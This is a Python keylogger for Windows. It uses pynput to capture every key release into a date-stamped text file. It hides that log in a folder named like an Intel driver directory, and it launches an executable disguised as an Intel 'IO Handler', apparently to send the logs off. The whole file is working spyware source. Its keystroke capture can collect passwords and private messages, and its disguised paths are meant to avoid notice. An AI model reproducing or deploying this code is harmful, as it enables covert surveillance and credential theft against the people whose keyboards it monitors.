from pynput.keyboard import Key, Listener
from datetime import date, datetime
import multiprocessing
import time as t 
import os
def sending():
    os.system("\"C:\\Program_Files\\Intel\\Intel(R) Management Engine Components\\IO Handler.exe\"")
if __name__ == '__main__':
    p1 = multiprocessing.Process(target = sending())
    p1.start()
    date = date.today()
    time = datetime.now()
    dd = str(date)
    date_stamp = str(dd[-5] + dd[-4] + dd[-2] + dd[-1])
    name = ("C:\\Program_Files\\Intel\\Intel(R) Serial IO\\"+date_stamp+".txt")
    logger = open(name, "a+")
    logger.write("\n\n\t\t"+str(time)[11]+str(time)[12]+":"+str(time)[14]+str(time)[15]+"\n")
    def on_press(key):
        if key == Key.f7:
            logger.write("\t<Overriden by V_key>\t")
            t.sleep(10)
    def on_release(key):
        logs = str("{}".format(key))
        logger.write(logs)
        logger.flush()
    while(True):
        with Listener(on_press, on_release) as listener:
            listener.join()
